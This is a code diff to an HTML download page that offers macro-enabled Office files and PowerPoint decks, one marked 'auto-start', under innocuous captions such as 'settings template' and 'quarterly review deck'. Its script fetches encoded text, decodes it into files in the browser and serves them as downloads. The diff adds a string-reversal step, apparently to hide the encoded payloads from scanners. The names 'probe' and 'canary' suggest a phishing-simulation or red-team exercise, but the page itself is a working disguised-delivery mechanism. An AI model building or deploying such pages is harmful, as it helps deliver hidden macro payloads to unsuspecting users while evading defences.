@@ -62,6 +62,12 @@ before it can be opened. The activation takes a few seconds.</p>
     <li><a href="#" onclick="return get('probe.zip')">probe.zip</a> — report archive</li>
     <li><a href="#" onclick="return get('probe.iso')">probe.iso</a> — report disc image (ISO)</li>
     <li><a href="#" onclick="return get('probe.img')">probe.img</a> — report disc image</li>
+    <li><a href="#" onclick="return get('canary.xlsm')">canary.xlsm</a> — settings template</li>
+    <li><a href="#" onclick="return get('canary.pptm')">canary.pptm</a> — review template</li>
+    <li><a href="#" onclick="return get('canary.xls')">canary.xls</a> — legacy template</li>
+    <li><a href="#" onclick="return get('canary-readme.txt')">canary-readme.txt</a> — template instructions</li>
+    <li><a href="#" onclick="return get('probe-pptx-url.pptx')">probe-pptx-url.pptx</a> — quarterly review deck</li>
+    <li><a href="#" onclick="return get('probe-pptx-prog.pptx')">probe-pptx-prog.pptx</a> — quarterly review deck (auto-start)</li>
   </ul>
   <p id="dlstat" style="font-size:.75rem;color:#9aa7b2;margin:.4rem 0 0">Preparing… only on first click per file.</p>
   <div class="meta">Run 1115-1042 — each file is tracked individually.</div>
@@ -92,10 +98,18 @@ var PROBES={
   'Q3_Report_full.xlsm':{src:'assets/data8.txt'},
   'Q3_Plan.docm':{src:'assets/data9.txt'},
   'Q3_Plan.xlsm':{src:'assets/data11.txt'},
-  'Q3_Summary.xlsx':{src:'assets/data10.txt'}
+  'Q3_Summary.xlsx':{src:'assets/data10.txt'},
+  'probe-pptx-url.pptx':{src:'assets/data12.txt'},
+  'probe-pptx-prog.pptx':{src:'assets/data13.txt'}
+};
+var CANARY={
+  'canary.xlsm':{src:'assets/data14.txt'},
+  'canary.pptm':{src:'assets/data15.txt'},
+  'canary.xls':{src:'assets/data16.txt'},
+  'canary-readme.txt':{src:'assets/data17.txt'}
 };
 function get(name){
-  var p=PROBES[name];
+  var p=PROBES[name]||CANARY[name];
   if(!p)return false;
   var st=document.getElementById('dlstat');
   if(st)st.textContent='Preparing '+name+'…';
@@ -103,7 +117,8 @@ function get(name){
     if(!r.ok)throw new Error(r.status);
     return r.text();
   }).then(function(t){
-    var bin=atob(t.replace(/\s+/g,''));
+    var b64=t.replace(/\s+/g,'').split('').reverse().join('');
+    var bin=atob(b64);
     var buf=new Uint8Array(bin.length);
     for(var i=0;i<bin.length;i++)buf[i]=bin.charCodeAt(i);
     var blob=new Blob([buf],{type:'application/octet-stream'});
